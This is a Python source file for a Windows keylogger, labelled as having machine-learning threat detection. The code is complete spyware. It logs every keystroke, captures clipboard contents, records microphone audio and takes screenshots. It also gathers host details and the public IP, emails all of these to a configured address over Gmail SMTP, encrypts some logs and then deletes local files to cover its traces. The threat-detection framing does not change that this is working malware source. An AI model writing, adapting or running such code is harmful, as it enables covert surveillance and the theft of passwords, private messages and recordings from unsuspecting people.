from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import numpy as np
import soundfile as sf
import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

print(sd.query_devices())
print("Default input device:", sd.default.device)


from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# Import ML threat detection
from threat_detection import analyze_keylog_file, predict_threat, analyze_text_chunks

keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

email_address = ""
password = "" 
username = getpass.getuser()

toaddr = ""

key = ""  # Generate an encryption key from the Cryptography folder



file_path = r"C:\Users\Admin\Desktop\Keylogger\Project"
extend = "\\"
file_merge = file_path + extend



def send_email(filename, attachment_path, toaddr, subject=None, body=None):
    
    try:
        fromaddr = email_address
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = subject if subject else f"Log File: {filename}"
        msg.attach(MIMEText(body if body else "Please find the attached log file.", 'plain'))

       
        if not os.path.exists(attachment_path):
            print(f"[!] File not found: {attachment_path}. Skipping email.")
            return

        with open(attachment_path, 'rb') as attachment_file:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment_file.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename={filename}")
            msg.attach(part)

       
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()  
        server.login(fromaddr, password)
        server.sendmail(fromaddr, toaddr, msg.as_string())
        server.quit()

        print(f"Email sent successfully: {filename}")

    except smtplib.SMTPAuthenticationError:
        print(f"Authentication failed. Check your Gmail App Password.")
    except Exception as e:
        print(f"Error sending email for {filename}: {e}")


def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()


def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

copy_clipboard()


def microphone():
 
    devices = sd.query_devices()
    input_devices = [i for i, d in enumerate(devices) if d['max_input_channels'] > 0]

    if not input_devices:
        print("No input devices found. Cannot record audio.")
        return

    input_index = input_devices[0]
    sd.default.device = (input_index, None)  

    fs = 44100
    seconds = microphone_time
    file_full_path = file_path + extend + audio_information

    print(f"Recording audio from device: {devices[input_index]['name']} ...")
    try:
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        
        if np.max(np.abs(myrecording)) > 0:
            myrecording = np.int16(myrecording / np.max(np.abs(myrecording)) * 32767)
        else:
            myrecording = np.int16(myrecording)
        write(file_full_path, fs, myrecording)
        print(f"Audio saved: {file_full_path}")
    except Exception as e:
        print(f"Error recording/saving audio: {e}")

microphone()

send_email(audio_information, file_path + extend + audio_information, toaddr)


def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()


print("\n" + "=" * 60)
print("KEYLOGGER WITH ML THREAT DETECTION STARTED")
print("=" * 60)
print(f"Monitoring keystrokes... Analysis every {time_iteration} seconds")
print("Press ESC to stop")
print("=" * 60 + "\n")

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration


while number_of_iterations < number_of_iterations_end:

    count = 0
    keys =[]

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()

        try:
            keylog_path = file_merge + keys_information
            threat_label, threat_prob, threat_text = analyze_keylog_file(keylog_path)
            
            if threat_label == "THREAT":
                print(f"⚠️ THREAT DETECTED! Probability: {threat_prob}")
                print(f"Threat text: {threat_text[:100]}...")
                alert_subject = f"THREAT ALERT - Probability: {threat_prob}"
                alert_body = f"""THREAT DETECTED IN KEYLOG!

Label: {threat_label}
Probability: {threat_prob}
Threat Text Preview: {threat_text[:200]}...

Full keylog file attached.
"""
                # Create a temporary alert file
                alert_file = file_merge + "threat_alert.txt"
                with open(alert_file, 'w') as f:
                    f.write(alert_body)
                    f.write(f"\n\nFull keylog content:\n{threat_text}")
                
                send_email("THREAT_ALERT.txt", alert_file, toaddr, alert_subject, alert_body)
                send_email(keys_information, keylog_path, toaddr, 
                          f"Keylog - Threat Detected (prob: {threat_prob})", 
                          f"Keylog file with detected threat (probability: {threat_prob})")
            else:
                print(f"✓ Analysis: {threat_label} (probability: {threat_prob})")
                # Send normal keylog
                send_email(keys_information, keylog_path, toaddr)
        except Exception as e:
            print(f"Error analyzing/sending keylog: {e}")
            # Fallback: send without analysis
            try:
                send_email(keys_information, file_merge + keys_information, toaddr)
            except:
                pass

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

# Encrypt files (final encryption of all files)
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:
    try:
        with open(files_to_encrypt[count], 'rb') as f:
            data = f.read()

        fernet = Fernet(key.encode())
        encrypted = fernet.encrypt(data)

        with open(encrypted_file_names[count], 'wb') as f:
            f.write(encrypted)

        
        if count < 2: 
            send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    except FileNotFoundError:
        print(f"File not found: {files_to_encrypt[count]}")
    except Exception as e:
        print(f"Error encrypting file {files_to_encrypt[count]}: {e}")
    count += 1

time.sleep(120)


delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    try:
        os.remove(file_merge + file)
    except FileNotFoundError:
        pass  
